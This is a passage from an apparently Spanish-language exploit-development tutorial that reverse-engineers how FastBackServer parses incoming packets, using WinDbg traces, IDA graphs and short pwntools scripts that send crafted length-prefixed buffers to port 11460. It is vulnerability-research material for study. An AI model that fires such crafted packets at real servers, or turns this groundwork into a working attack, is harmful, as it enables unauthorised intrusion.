04f7a088  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04f7a098  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04f7a0a8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04f7a0b8  41 41 41 41 00 00 00 00-00 00 00 00 00 00 00 00  AAAA............  
04f7a0c8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................  </span>
</code></pre></div></div><br>

<p class="plain-text">Las aplicaciones normalmente realizan alguna verificación en las entradas, asi que lo que haremos será ir a <code class="language-plaintext highlighter-rouge">IDA</code> y verificar el destino, podemos ver que el buffer de destino se encuentra en <code class="language-plaintext highlighter-rouge">edx + ecx + 0x4438</code>, veamos si esto se usa en otros bloques</p>
<a href="/exploit-development/windows-user/reverse-engineering/11.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/11.png"></p></div></a>

<p class="plain-text">En el bloque de la dirección <code class="language-plaintext highlighter-rouge">0x00581752</code> podemos ver que se invierte el endianess del <code class="language-plaintext highlighter-rouge">dword</code>, este ejecuta un <code class="language-plaintext highlighter-rouge">shl</code> para invertir el orden de cada byte individualmente</p>
<a href="/exploit-development/windows-user/reverse-engineering/12.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/12.png"></p></div></a>

<p class="plain-text">Al terminar el bloque actual, el último byte ahora sera el primero, este mismo proceso se aplica para el resto de los bytes utilizando <code class="language-plaintext highlighter-rouge">shl</code> con longitudes diferentes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">? 0x41414141 & 0xff  
Evaluate expression: 65 = 00000041

</span><span class="ro">0:000></span><span class="p"> ? 0x41 << 0x18
Evaluate expression: 1090519040 = 41000000  </span>
</code></pre></div></div><br>

<p class="plain-text">Al final del bloque podemos ver que el valor original del offset <code class="language-plaintext highlighter-rouge">0x4438</code> se modifica con el valor guardado en <code class="language-plaintext highlighter-rouge">eax</code>, luego se compara con <code class="language-plaintext highlighter-rouge">0</code> y se realiza un salto condicional, Vamos por la linea roja ya que no es igual a <code class="language-plaintext highlighter-rouge">0</code>, el primer condicional <code class="language-plaintext highlighter-rouge">jl</code> se realiza cuando el primer argumento de <code class="language-plaintext highlighter-rouge">cmp</code> es menor que el segundo, el resultado de <code class="language-plaintext highlighter-rouge">jl</code> esta basado en las flags <code class="language-plaintext highlighter-rouge">sf</code> y <code class="language-plaintext highlighter-rouge">of</code> que se establecen al realizar la comparación, la siguiente <a href="https://faydoc.tripod.com/cpu/jl.htm">publicación</a> nos dice que podriamos interpretarlo como <code class="language-plaintext highlighter-rouge">sf<>of</code></p>
<a href="/exploit-development/windows-user/reverse-engineering/13.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/13.png"></p></div></a>

<p class="plain-text">La forma de reconocer un valor como positivo o negativo es a través del bit mas alto, en este caso podemos convertir el valor a binario usando <code class="language-plaintext highlighter-rouge">.formats</code>, nos encontramos con que el bit mas alto es <code class="language-plaintext highlighter-rouge">0</code> y se puede interpretar como positivo, en nuestro caso el resultado de la operación aun es <code class="language-plaintext highlighter-rouge">0x41414141</code>, si el bit mayor del resultado esta activado activa la flag <code class="language-plaintext highlighter-rouge">sf</code>, la flag <code class="language-plaintext highlighter-rouge">of</code> se activa cuando se cambia el signo y dado que ambos operandos son positivos este tampoco se activará en esta comparación</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">.formats 0x41414141  
Evaluate expression:
  Hex:     41414141
  Decimal: 1094795585
  Octal:   10120240501
  Binary:  01000001 01000001 01000001 01000001  
  Chars:   AAAA
  Time:    Fri Sep 10 00:53:05 2004
  Float:   low 12.0784 high 0
  Double:  5.40901e-315</span>
</code></pre></div></div><br>

<p class="plain-text">En nuestro caso ambas banderas son iguales por lo que saltamos a la linea roja, este realiza la comparación del <code class="language-plaintext highlighter-rouge">dword</code> ahora contra <code class="language-plaintext highlighter-rouge">0x100000</code>, y ejecuta un <code class="language-plaintext highlighter-rouge">jbe</code>, este se ejecuta si el primer valor del <code class="language-plaintext highlighter-rouge">cmp</code> es menor o igual que el segundo tomando la operación sin signo, según esta <a href="https://faydoc.tripod.com/cpu/jl.htm">publicación</a> podemos interpretarla como <code class="language-plaintext highlighter-rouge">cf=1</code> or <code class="language-plaintext highlighter-rouge">zf=1</code>, el <code class="language-plaintext highlighter-rouge">dword</code> tiene que contener el valor <code class="language-plaintext highlighter-rouge">0x100000</code> para activar <code class="language-plaintext highlighter-rouge">zf</code> y menor para <code class="language-plaintext highlighter-rouge">cf</code>, entonces para realizar el salto debemos elegir un valor mas pequeño</p>
<a href="/exploit-development/windows-user/reverse-engineering/58.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/58.png"></p></div></a>

<p class="plain-text">Volvemos a <code class="language-plaintext highlighter-rouge">WinDbg</code>, como sospechabamos el salto no se realizará debido a que el valor del <code class="language-plaintext highlighter-rouge">dword</code> es mas grande que <code class="language-plaintext highlighter-rouge">0x100000</code>, volvamos al desensamblador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=04f7a020 ebx=05fcacd0 ecx=04f7a020 edx=04f7a020 esi=05fcacd0 edi=00669360
eip=005817d3 esp=0d32fea0 ebp=0d32feb0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!FX_AGENT_CopyReceiveBuff+0x19d:
005817d3 81b93844000000001000 cmp dword ptr [ecx+4438h],100000h ds:0023:04f7e458=41414141

</span><span class="ro">0:000></span><span class="p"> p
eax=04f7a020 ebx=05fcacd0 ecx=04f7a020 edx=04f7a020 esi=05fcacd0 edi=00669360
eip=005817dd esp=0d32fea0 ebp=0d32feb0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1a7:
005817dd 7607            jbe     FastBackServer!FX_AGENT_CopyReceiveBuff+0x1b0 (005817e6) [br=0]  </span>
</code></pre></div></div><br>

<p class="plain-text">Al no realizar el salto nos vamos por la linea roja a la izquierda del bloque, sin embargo esta va hasta la parte final y sigue al retorno, puede que sea interesante analizar todo lo de la parte derecha, esto se hace reduciendo el valor del <code class="language-plaintext highlighter-rouge">dword</code> a un tamaño menor, de esta forma se cumple la condición de la instrucción <code class="language-plaintext highlighter-rouge">jbe</code></p>
<a href="/exploit-development/windows-user/reverse-engineering/14.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/14.png"></p></div></a>

<p class="plain-text">Además, la linea roja nos lleva a un valor de retorno <code class="language-plaintext highlighter-rouge">0</code> que podriamos interpretar como <code class="language-plaintext highlighter-rouge">false</code> y la parte derecha un <code class="language-plaintext highlighter-rouge">1</code> que podriamos interpretar como <code class="language-plaintext highlighter-rouge">true</code></p>
<a href="/exploit-development/windows-user/reverse-engineering/15.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/15.png"></p></div></a>

<p class="plain-text">Para activar el <code class="language-plaintext highlighter-rouge">jbe</code> necesitamos un valor menor a <code class="language-plaintext highlighter-rouge">0x100000</code>, usaremos <code class="language-plaintext highlighter-rouge">0x1234</code>, sin embargo sabemos que el endianess se invierte antes de entrar en este bloque, entonces le enviaremos el <code class="language-plaintext highlighter-rouge">dword</code> como <code class="language-plaintext highlighter-rouge">big-endian</code> para que obtenga el formato correcto en tiempo de ejecución, osea para su formato <code class="language-plaintext highlighter-rouge">little-endian</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="mi"> *

</span><span class="p">payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
</span><span class="p">payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x1234</span><span class="p">, endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">)  
</span><span class="p">payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 100</span><span class="p">

shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"Windows"</span><span class="p">,</span><span class="mi"> 11460</span><span class="p">)
shell.send(payload)</span>
</code></pre></div></div><br>

<p class="plain-text">Establecemos el breakpoint en la comparación y al realizarla lo hace con el valor en <code class="language-plaintext highlighter-rouge">little-endian</code>, como el <code class="language-plaintext highlighter-rouge">dword</code> es menor que <code class="language-plaintext highlighter-rouge">0x100000</code> tenemos que <code class="language-plaintext highlighter-rouge">br=1</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp FastBackServer!FX_AGENT_CopyReceiveBuff + 0x19d

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=0d39a020 ebx=05c9b3b8 ecx=0d39a020 edx=0d39a020 esi=05c9b3b8 edi=00669360
eip=005817d3 esp=0e3ffea0 ebp=0e3ffeb0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FX_AGENT_CopyReceiveBuff+0x19d:
005817d3 81b93844000000001000 cmp dword ptr [ecx+4438h],100000h ds:0023:0d39e458=00001234

</span><span class="ro">0:000></span><span class="p"> p
eax=0d39a020 ebx=05c9b3b8 ecx=0d39a020 edx=0d39a020 esi=05c9b3b8 edi=00669360
eip=005817dd esp=0e3ffea0 ebp=0e3ffeb0 iopl=0         nv up ei ng nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1a7:
005817dd 7607            jbe     FastBackServer!FX_AGENT_CopyReceiveBuff+0x1b0 (005817e6) [br=1]  </span>
</code></pre></div></div><br>

<p class="plain-text">Ahora podemos seguir el flujo de la bifurcación en <code class="language-plaintext highlighter-rouge">IDA</code> y en el bloque de la dirección <code class="language-plaintext highlighter-rouge">0x0058180b</code> podemos ver que se utiliza de nuevo el <code class="language-plaintext highlighter-rouge">dword</code> en el offset <code class="language-plaintext highlighter-rouge">0x4438</code></p>
<a href="/exploit-development/windows-user/reverse-engineering/16.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/16.png"></p></div></a>

<p class="plain-text">Siguiendo el flujo en <code class="language-plaintext highlighter-rouge">WinDbg</code> al final podemos ver una comparación entre el dword <code class="language-plaintext highlighter-rouge">0x1234</code> y el valor <code class="language-plaintext highlighter-rouge">0x64</code> que es la longitud de nuestra entrada sin contar el primer <code class="language-plaintext highlighter-rouge">dword</code>, también vemos que el contenido de la variable <code class="language-plaintext highlighter-rouge">FX_AGENT_dwHeaderLength</code> se añade al <code class="language-plaintext highlighter-rouge">dword</code> seguido de una resta del valor en el offset <code class="language-plaintext highlighter-rouge">0x20</code> de <code class="language-plaintext highlighter-rouge">edx</code>, ambos valores son <code class="language-plaintext highlighter-rouge">4</code> por lo que no afectarán nuestro <code class="language-plaintext highlighter-rouge">dword</code>, podemos tomar esto como una comprobación para verificar que todos los datos fueron recibidos correctamente</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=0d39a020 ebx=05c9b3b8 ecx=00000064 edx=0d39a020 esi=05c9b3b8 edi=00669360
eip=0058181a esp=0e3ffea0 ebp=0e3ffeb0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1e4:
0058181a 8b8238440000    mov     eax,dword ptr [edx+4438h] ds:0023:0d39e458=00001234

</span><span class="ro">0:000></span><span class="p"> p
eax=00001234 ebx=05c9b3b8 ecx=00000064 edx=0d39a020 esi=05c9b3b8 edi=00669360
eip=00581820 esp=0e3ffea0 ebp=0e3ffeb0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1ea:
00581820 030590eb8500    add     eax,dword ptr [FastBackServer!FX_AGENT_dwHeaderLength (0085eb90)] ds:0023:0085eb90=00000004  

</span><span class="ro">0:000></span><span class="p"> p
eax=00001238 ebx=05c9b3b8 ecx=00000064 edx=0d39a020 esi=05c9b3b8 edi=00669360
eip=00581826 esp=0e3ffea0 ebp=0e3ffeb0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f0:
00581826 8b5508          mov     edx,dword ptr [ebp+8] ss:0023:0e3ffeb8=0d39a020

</span><span class="ro">0:000></span><span class="p"> p
eax=00001238 ebx=05c9b3b8 ecx=00000064 edx=0d39a020 esi=05c9b3b8 edi=00669360
eip=00581829 esp=0e3ffea0 ebp=0e3ffeb0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f3:
00581829 2b4220          sub     eax,dword ptr [edx+20h] ds:0023:0d39a040=00000004  

</span><span class="ro">0:000></span><span class="p"> p
eax=00001234 ebx=05c9b3b8 ecx=00000064 edx=0d39a020 esi=05c9b3b8 edi=00669360
eip=0058182c esp=0e3ffea0 ebp=0e3ffeb0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6:
0058182c 3bc8            cmp     ecx,eax

</span><span class="ro">0:000></span><span class="p"> r eax; r ecx
eax=00001234
ecx=00000064</span>
</code></pre></div></div><br>

<p class="plain-text">Actualizamos nuestro script, el primer <code class="language-plaintext highlighter-rouge">dword</code> es la longitud de nuestros datos que es <code class="language-plaintext highlighter-rouge">0x64</code>, ahora al llegar a la comparación ambos valores son exactamente iguales</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from</span><span class="p"> pwn </span><span class="o">import</span><span class="mi"> *

</span><span class="p">payload  </span><span class="o">=</span><span class="no"> b</span><span class="s">""
</span><span class="p">payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x64</span><span class="p">, endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">)  
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 100</span><span class="p">

shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"Windows"</span><span class="p">,</span><span class="mi"> 11460</span><span class="p">)
shell.send(payload)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp FastBackServer!FX_AGENT_CopyReceiveBuff + 0x1f6

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=00000064 ebx=05c9b3b8 ecx=00000064 edx=04d46020 esi=05c9b3b8 edi=00669360  
eip=0058182c esp=0e5ffea0 ebp=0e5ffeb0 iopl=0         nv up ei pl nz na po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202  
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1f6:
0058182c 3bc8            cmp     ecx,eax

</span><span class="ro">0:000></span><span class="p"> r eax; r ecx
eax=00000064
ecx=00000064</span>
</code></pre></div></div><br>

<p class="plain-text">El código del siguiente bloque nuevamente realiza operaciones sobre nuestro <code class="language-plaintext highlighter-rouge">dword</code>, igual que antes añade la variable que contiene el valor <code class="language-plaintext highlighter-rouge">4</code> y resta <code class="language-plaintext highlighter-rouge">4</code> del desreferenciado de <code class="language-plaintext highlighter-rouge">edx + 0x20</code> por lo que no tiene ningún efecto sobre el</p>
<a href="/exploit-development/windows-user/reverse-engineering/17.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/17.png"></p></div></a>

<p class="plain-text">Al final del bloque nuestro <code class="language-plaintext highlighter-rouge">dword</code> se guarda en una dirección del stack, sin embargo el valor se utiliza en el siguente bloque de forma inmediata, en este bloque se realiza otro <code class="language-plaintext highlighter-rouge">memcpy</code> y se pasa el primer <code class="language-plaintext highlighter-rouge">dword</code> como el parametro <code class="language-plaintext highlighter-rouge">size</code>, podemos asumir que el segundo parametro es nuestro buffer de datos y el primero un nuevo buffer</p>
<a href="/exploit-development/windows-user/reverse-engineering/18.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/18.png"></p></div></a>

<p class="plain-text">Si inspeccionamos la memoria <code class="language-plaintext highlighter-rouge">4</code> bytes del segundo argumento podemos ver nuestro primer dword, esto quiere decir que quitando el primer <code class="language-plaintext highlighter-rouge">dword</code> se copiará a otro buffer</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dd poi(esp + 4) - 4 L1  
04d46058  64000000</span>
</code></pre></div></div><br>

<p class="plain-text">Si seguimos el flujo en <code class="language-plaintext highlighter-rouge">IDA</code> hasta antes del <code class="language-plaintext highlighter-rouge">ret</code> podemos ver que ahora se establece en <code class="language-plaintext highlighter-rouge">eax</code> el valor de retorno en <code class="language-plaintext highlighter-rouge">1</code> también interpretado como <code class="language-plaintext highlighter-rouge">true</code> y sale</p>
<a href="/exploit-development/windows-user/reverse-engineering/19.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/19.png"></p></div></a>

</section>

<section class="post" id="protocol">
<br><h3 class="post-title">Protocol</h3><br>

<p class="plain-text">Luego de haber entendido como funciona <code class="language-plaintext highlighter-rouge">FX_AGENT_CopyReceiveBuff</code> necesitamos analizar la función a donde retorna, para ello continuamos hasta el siguiente <code class="language-plaintext highlighter-rouge">ret</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> pt
eax=00000001 ebx=05c9b3b8 ecx=04d46020 edx=04d46020 esi=05c9b3b8 edi=00669360  
eip=005818d2 esp=0e5ffeb4 ebp=0e5ffec0 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
FastBackServer!FX_AGENT_CopyReceiveBuff+0x29c:
005818d2 c3              ret

</span><span class="ro">0:000></span><span class="p"> p
eax=00000001 ebx=05c9b3b8 ecx=04d46020 edx=04d46020 esi=05c9b3b8 edi=00669360  
eip=005815d3 esp=0e5ffeb8 ebp=0e5ffec0 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
FastBackServer!FX_AGENT_GetData+0xd:
005815d3 83c404          add     esp,4</span>
</code></pre></div></div><br>

<p class="plain-text">Volviendo a <code class="language-plaintext highlighter-rouge">IDA</code> podemos ver que se llama desde <code class="language-plaintext highlighter-rouge">FX_AGENT_GetData</code>, el valor de retorno se compara con <code class="language-plaintext highlighter-rouge">0</code>, la comparación de nuestro caso es <code class="language-plaintext highlighter-rouge">1</code> por lo que tomara el salto <code class="language-plaintext highlighter-rouge">jnz</code> que nos llevará por la linea verde, en este hay una llamada a la función <code class="language-plaintext highlighter-rouge">FX_AGENT_CheckPacketIsComplete</code> que nos falta reversear, sin embargo por el nombre podemos deducir que validará que se hayan recibido todos los datos correctamente</p>
<a href="/exploit-development/windows-user/reverse-engineering/20.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/20.png"></p></div></a>

<p class="plain-text">Ya que la función <code class="language-plaintext highlighter-rouge">recv</code> donde iniciamos utiliza un tamaño de <code class="language-plaintext highlighter-rouge">0x4400</code> bytes cualquier paquete que enviemos menor a ese tamaño deberia ser recibido sin problemas por lo que <code class="language-plaintext highlighter-rouge">FX_AGENT_CheckPacketIsComplete</code> deveria devolver <code class="language-plaintext highlighter-rouge">1</code> o <code class="language-plaintext highlighter-rouge">true</code>, podemos comprobarlo pasando por encima del <code class="language-plaintext highlighter-rouge">call</code> en <code class="language-plaintext highlighter-rouge">WinDbg</code>, el valor en <code class="language-plaintext highlighter-rouge">eax</code> es <code class="language-plaintext highlighter-rouge">1</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=04d46020 ebx=05c9b3b8 ecx=04d46020 edx=04d46020 esi=05c9b3b8 edi=00669360
eip=00581618 esp=0e5ffeb8 ebp=0e5ffec0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FX_AGENT_GetData+0x52:
00581618 e8b6020000      call    FastBackServer!FX_AGENT_CheckPacketIsComplete (005818d3)  

</span><span class="ro">0:000></span><span class="p"> p
eax=00000001 ebx=05c9b3b8 ecx=04d46020 edx=04d46020 esi=05c9b3b8 edi=00669360
eip=0058161d esp=0e5ffeb8 ebp=0e5ffec0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FX_AGENT_GetData+0x57:
0058161d 83c404          add     esp,4</span>
</code></pre></div></div><br>

<p class="plain-text">El valor de retorno se compara con <code class="language-plaintext highlighter-rouge">0</code>, ya que nuestro valor de retorno es <code class="language-plaintext highlighter-rouge">1</code> la comparación <code class="language-plaintext highlighter-rouge">jz</code> no se cumple y  tomará la linea roja que lleva al siguiente bloque, que simplemente mueve a <code class="language-plaintext highlighter-rouge">eax</code> el valor <code class="language-plaintext highlighter-rouge">1</code> antes saltar al bloque de retorno</p>
<a href="/exploit-development/windows-user/reverse-engineering/21.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/21.png"></p></div></a>

<p class="plain-text">Luego de lo que analizamos terminamos la función <code class="language-plaintext highlighter-rouge">FX_AGENT_GetData</code>, por el nombre podemos entender que esta se encarga de recibir los datos que se procesarán posteriormente por lo que nuevamente continuaremos hasta el retorno</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> pt
eax=00000001 ebx=05c9b3b8 ecx=04d46020 edx=04d46020 esi=05c9b3b8 edi=00669360  
eip=00581635 esp=0e5ffec4 ebp=0e5ffef0 iopl=0         nv up ei pl nz na po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202  
FastBackServer!FX_AGENT_GetData+0x6f:
00581635 c3              ret

</span><span class="ro">0:000></span><span class="p"> p
eax=00000001 ebx=05c9b3b8 ecx=04d46020 edx=04d46020 esi=05c9b3b8 edi=00669360  
eip=00581320 esp=0e5ffec8 ebp=0e5ffef0 iopl=0         nv up ei pl nz na po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202  
FastBackServer!FX_AGENT_Cyclic+0xd0:
00581320 83c404          add     esp,4</span>
</code></pre></div></div><br>

<p class="plain-text">Al retornar podemos ver que la función fue llamada desde <code class="language-plaintext highlighter-rouge">FX_AGENT_Cyclic</code>, en este bloque el valor de retorno se compara con <code class="language-plaintext highlighter-rouge">0</code> por lo que <code class="language-plaintext highlighter-rouge">jz</code> no se cumple y sigue la linea roja, en este se hace una comparación con <code class="language-plaintext highlighter-rouge">0</code> de un <code class="language-plaintext highlighter-rouge">dword</code> en el offset <code class="language-plaintext highlighter-rouge">0x4438</code>, este offset estatico es el mismo que se usaba antes como referencia al inicio de los datos en la comprobación del checksum analizado anteriormente</p>
<a href="/exploit-development/windows-user/reverse-engineering/22.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/22.png"></p></div></a>

<p class="plain-text">Para asegurarnos que sea el inicio de nuestro buffer podemos avanzar hasta la comparación donde podemos ver que el <code class="language-plaintext highlighter-rouge">dword</code> tiene como valor el <code class="language-plaintext highlighter-rouge">0x64</code> que enviamos al inicio, y ya que no se cumple el <code class="language-plaintext highlighter-rouge">jnz</code> seguira por la linea verde</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> p
eax=00000001 ebx=05c9b3b8 ecx=04d46020 edx=04d46020 esi=05c9b3b8 edi=00669360
eip=0058132f esp=0e5ffecc ebp=0e5ffef0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FX_AGENT_Cyclic+0xdf:
0058132f 83ba3844000000  cmp     dword ptr [edx+4438h],0 ds:0023:04d4a458=00000064  </span>
</code></pre></div></div><br>

<p class="plain-text">Siguiendo la linea roja llegamos a un bloque donde se llama a la función llamada <code class="language-plaintext highlighter-rouge">FXCLI_C_ReceiveCommand</code>, por el nombre nos sugiere que nuestro buffer se usará en algun lugar del programa de acuerdo a su valor asi que la analizaremos</p>
<a href="/exploit-development/windows-user/reverse-engineering/23.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/23.png"></p></div></a>

<p class="plain-text">Antes de llamar a la función podemos ver sus <code class="language-plaintext highlighter-rouge">4</code> argumentos, el ultimo <code class="language-plaintext highlighter-rouge">dword</code> es un valor estático <code class="language-plaintext highlighter-rouge">1</code>, el penultimo tiene el valor del checksum <code class="language-plaintext highlighter-rouge">0x64</code> del offset <code class="language-plaintext highlighter-rouge">0x4438</code>, y los otros <code class="language-plaintext highlighter-rouge">2 dwords</code> parecen punteros hacia otros datos que ahora volcaremos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">pc
eax=04d46020 ebx=05c9b3b8 ecx=00000064 edx=04d4a45c esi=05c9b3b8 edi=00669360
eip=00581361 esp=0e5ffebc ebp=0e5ffef0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!FX_AGENT_Cyclic+0x111:
00581361 e8898dfeff      call    FastBackServer!FXCLI_C_ReceiveCommand (0056a0ef)  

</span><span class="ro">0:000></span><span class="p"> dds esp L4
0e5ffebc  04d46020
0e5ffec0  04d4a45c
0e5ffec4  00000064
0e5ffec8  00000001</span>
</code></pre></div></div><br>

<p class="plain-text">El primer puntero apunta hacia nuestro buffer, pero antes del buffer se encuentran algunos metadatos, en el segundo se apunta solo al buffer despues del <code class="language-plaintext highlighter-rouge">memcpy</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> db poi(esp)
04d46020  18 a3 96 00 18 a3 96 00-00 00 00 00 c0 03 00 00  ................  
04d46030  02 00 ce 9e c0 a8 e9 80-00 00 00 00 00 00 00 00  ................  
04d46040  68 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  h...............  
04d46050  48 0b 00 00 01 00 00 00-00 00 00 64 41 41 41 41  H..........dAAAA  
04d46060  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04d46070  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04d46080  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04d46090  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  

</span><span class="ro">0:000></span><span class="p"> db poi(esp + 4)
04d4a45c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04d4a46c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04d4a47c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04d4a48c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04d4a49c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04d4a4ac  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04d4a4bc  41 41 41 41 00 00 00 00-00 00 00 00 00 00 00 00  AAAA............  
04d4a4cc  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................  </span>
</code></pre></div></div><br>

<p class="plain-text">Entramos a <code class="language-plaintext highlighter-rouge">FXCLI_C_ReceiveCommand</code>, en el primer bloque tenemos una comparación del tercer argumento con <code class="language-plaintext highlighter-rouge">0x30</code>, sabemos que es <code class="language-plaintext highlighter-rouge">0x64</code> por lo que no seguirá a la linea del <code class="language-plaintext highlighter-rouge">jz</code> sino que seguirá la linea roja que nos lleva al siguiente bloque</p>
<a href="/exploit-development/windows-user/reverse-engineering/25.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/25.png"></p></div></a>

<p class="plain-text">El bloque comprueba el limite del tamaño con <code class="language-plaintext highlighter-rouge">0x186a0</code>, mientras nuestro tamaño sea menor, <code class="language-plaintext highlighter-rouge">jbe</code> se cumple asi que ahora seguimos a la linea verde de la comparación</p>
